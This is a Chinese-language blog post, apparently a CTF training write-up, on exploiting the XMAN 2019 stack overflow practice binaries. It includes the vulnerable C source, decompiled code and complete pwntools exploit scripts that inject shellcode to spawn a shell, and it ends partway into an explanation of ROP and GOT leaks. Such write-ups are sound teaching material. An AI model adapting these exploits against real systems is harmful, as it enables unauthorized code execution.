@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出simple_stackoverflow2到ROP的simple_stackoverflow2_nx过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU simple_stackoverf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XMAN-2019-福州-PWN-stackoverflow（上）">
+<meta property="og:url" content="http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╔╧ú⌐/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出simple_stackoverflow2到ROP的simple_stackoverflow2_nx过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU simple_stackoverf">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-07T05:38:02.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XMAN-2019-福州-PWN-stackoverflow（上）">
+<meta name="twitter:description" content="今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出simple_stackoverflow2到ROP的simple_stackoverflow2_nx过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU simple_stackoverf">
+  <link rel="canonical" href="http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╔╧ú⌐/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>XMAN-2019-福州-PWN-stackoverflow（上） | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╔╧ú⌐/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">XMAN-2019-福州-PWN-stackoverflow（上）
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-08-06 07:34:45 / Geändert am: 22:38:02" itemprop="dateCreated datePublished" datetime="2019-08-06T07:34:45-07:00">2019-08-06</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出<code>simple_stackoverflow2</code>到ROP的<code>simple_stackoverflow2_nx</code>过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。</p>
+<p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p>
+<h2 id="simple-stackoverflow"><a href="#simple-stackoverflow" class="headerlink" title="simple_stackoverflow"></a>simple_stackoverflow</h2><p>先看看源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">24</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">1023</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>IDA Pro反汇编出来的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  overflow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;::buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检查一下开启的保护措施</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>可以得知存在非常明显的栈溢出漏洞，只要第一次把shellcode写入全局的buf内存中，第二次通过栈溢出覆盖返回地址，使流程跳转到shellcode地址处执行shellcode代码即可。</p>
+<p>通过计算得出栈的大小应该为<code>0x20 = 32</code>,然后因为32位机器加上4个字节即为<code>36</code>，也可以通过工具中的    <code>pattern.py</code>脚本计算得出。</p>
+<p>使用<code>pattern.py</code>脚本首先生成字符串</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py create 150</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure>
+
+<p>然后通过gdb调试程序，在输入点输入字符串，然后可以得到溢出的内存地点</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41326241 in ?? ()</span><br></pre></td></tr></table></figure>
+
+<p>然后通过脚本计算溢出点</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py offset 0x41326241</span><br><span class="line">hex pattern decoded as: Ab2A</span><br><span class="line">36</span><br></pre></td></tr></table></figure>
+
+<p>通过IDA Pro可以找到全局buf的地址为<code>0x804a060</code></p>
+<p>则我们的payload可以这样写</p>
+<p><code>36 * &#39;A&#39;+p32(0x804a060)</code></p>
+<p>最终的Exploit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./simple_stackoverflow'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a060</span></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.sendline(<span class="number">36</span> * <span class="string">'A'</span> + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="simple-stackoverflow2"><a href="#simple-stackoverflow2" class="headerlink" title="simple_stackoverflow2"></a>simple_stackoverflow2</h2><p>先看看源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">24</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">1023</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后看看IDA反汇编出来的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> overflow();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检查一下开启的保护措施</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>可以得知存在非常明显的栈溢出漏洞，但是这一次没有全局可写的buf地址，我们先看看我们有什么可以利用的点，可以进行ROP</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2$ objdump -R simple_stackoverflow2</span><br><span class="line"></span><br><span class="line">simple_stackoverflow2:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a040 R_386_COPY        stderr@@GLIBC_2.0</span><br><span class="line">0804a044 R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a060 R_386_COPY        stdout@@GLIBC_2.0</span><br><span class="line">0804a00c R_386_JUMP_SLOT   setbuf@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   read@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+
+<p>可以发现有一个read函数可以利用并且程序也没有开启地址随机化，这样我们只需要在溢出时跳转到read函数的地址调用read函数在buf读入shellcode，然后控制read函数的返回地址为buf继续执行shellcode就完成了</p>
+<p>首先read函数<code>ssize_t read [1]  (int fd, void *buf, size_t count);</code></p>
+<p>我们需要将第一个参数置为1，第二个参数为要写入的buf地址，第三个为buf的大小</p>
+<p>于是就有<code>p32(0)+p32(buf2_addr)+p32(0x100)</code></p>
+<p>然后因为还需要控制read函数的返回地址到buf处</p>
+<p>于是就有<code>36 *&quot;a&quot; + p32(e.symbols[&quot;read&quot;]) + p32(buf2_addr)</code></p>
+<p>最终的Exploit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./simple_stackoverflow2'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">e = ELF(<span class="string">'./simple_stackoverflow2'</span>)</span><br><span class="line">buf2_addr = <span class="number">0x0804a100</span></span><br><span class="line">payload1 = <span class="number">36</span> *<span class="string">"a"</span> + p32(e.symbols[<span class="string">"read"</span>]) + p32(buf2_addr)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)+p32(buf2_addr)+p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="simple-stackoverflow2-nx"><a href="#simple-stackoverflow2-nx" class="headerlink" title="simple_stackoverflow2_nx"></a>simple_stackoverflow2_nx</h2><p>先看看源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">24</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">1023</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后看看IDA反汇编出来的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> overflow();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检查一下开启的保护措施</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到和上一题最大的不同点就是开启了NX防护，这样子的话我们的栈就变为了不可执行，通过检查也的确是这样的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> vmmap</span><br><span class="line">Warning: not running</span><br><span class="line">Start      End        Perm	Name</span><br><span class="line">0x0804835c 0x080485e8 rx-p	/home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx</span><br><span class="line">0x08048154 0x08048714 r--p	/home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx</span><br><span class="line">0x08049f08 0x0804a06c rw-p	/home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx</span><br></pre></td></tr></table></figure>
+
+<p>但是我们依然有办法执行系统调用<code>system(&quot;/bin/sh&quot;)</code></p>
+<p>利用 ropgadget，我们可以查看是否有 <code>/bin/sh</code> 存在</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx$ ROPgadget --binary simple_stackoverflow2_nx --string '/bin/sh' </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure>
+
+<p>可以知道不存在<code>/bin/sh</code></p>
+<p>查找一下是否有<code>system</code> 函数存在。经在 ida 中查找，不存在。</p>
+<p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下 </li>
+<li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></li>
+</ul>
+<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
+<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
